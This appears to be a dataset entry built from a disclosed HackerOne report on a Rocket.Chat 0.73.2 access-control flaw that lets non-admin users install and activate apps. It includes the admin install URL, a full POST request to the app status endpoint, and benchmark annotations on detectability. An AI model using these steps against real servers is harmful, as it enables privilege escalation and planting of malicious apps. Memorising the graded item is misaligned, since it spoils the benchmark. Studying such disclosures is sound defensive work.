{
  "reported_to": "Rocket.Chat",
  "reported_by": "theappsec ",
  "title": "Broken access control on apps ",
  "content": "\nSummary:\nThe user without administrative privileges can upload and install any Application into the rocket.chat\nAs ID of application is controlled in the app.json file (which is controlled by uploader) user can also activate the app.\nReleases Affected:\n0.73.2\nSteps To Reproduce:\nUser log-in into the chat\nUser open the following link:\nCode 44 Bytes\n1http://<rocket-chat.link>>/admin/app/install\nUpload any app\nActivate it by send the following POST request to the installed app:\nCode 440 Bytes\n1POST /api/apps/<ID_of_the_installed_App>/status HTTP/1.1\n2Host: rocket-chat.link\n3User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\n4Accept: */*\n5Accept-Language: en-US,en;q=0.5\n6Accept-Encoding: gzip, deflate\n7Content-Type: application/json\n8X-User-Id: [redacted]\n9X-Auth-Token: [redacted]\n10X-Requested-With: XMLHttpRequest\n11Cookie: [redacted]\n12DNT: 1\n13Connection: close\n14Content-Length: 29\n15\n16{\"status\":\"manually_enabled\"}\nSupporting Material/References:\nYou can see the uploading process in the attached video. Left user is admin, right - user without any additional privileges.\nSuggested mitigation\nManaging apps should be available to admins only.\nImpact\nUsers can install and activate malicious apps into the rocket.chat.\n\n",
  "severity": [
    9.6,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Improper Access Control - Generic"
  ],
  "screenshots": {},
  "disclosed_date": 1561207260,
  "report_url": "https://hackerone.com/reports/491892",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "User logs into Rocket.Chat without administrative privileges."
    ],
    [
      2,
      "User accesses the app installation URL: http://<rocket-chat.link>/admin/app/install"
    ],
    [
      3,
      "User uploads any app by manipulating the app.json file to control the app ID."
    ],
    [
      4,
      "User activates the app by sending a POST request to the installed app's status endpoint with the payload {\"status\":\"manually_enabled\"}."
    ]
  ],
  "vuln_description": "A broken access control vulnerability allows non-admin users to upload and activate any application in Rocket.Chat by manipulating the app ID in the app.json file and sending a specific POST request to enable the app.",
  "reason": "The vulnerability involves straightforward steps\u2014accessing a URL, uploading an app, and sending a POST request\u2014without requiring deep understanding of complex interactions or novel logic. The main challenge is knowing the exact endpoints and the JSON payload format, which is not highly complex.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "idor_detectable": false,
  "authnz_byppass_detectable": true,
  "is_simple_payload": false,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reasoning": "The vulnerability involves a non-admin user accessing admin functionality (app installation and activation). The methodology checks for AuthZ bypass by swapping user sessions (non-privileged user sessions) against admin actions. Since app installation via /admin/app/install and activation via POST /api/apps/<ID>/status are admin actions, testing these endpoints with non-admin sessions (methodology step 4b/c) would detect this authorization boundary violation.",
    "is_simple_authnz": true
  }
}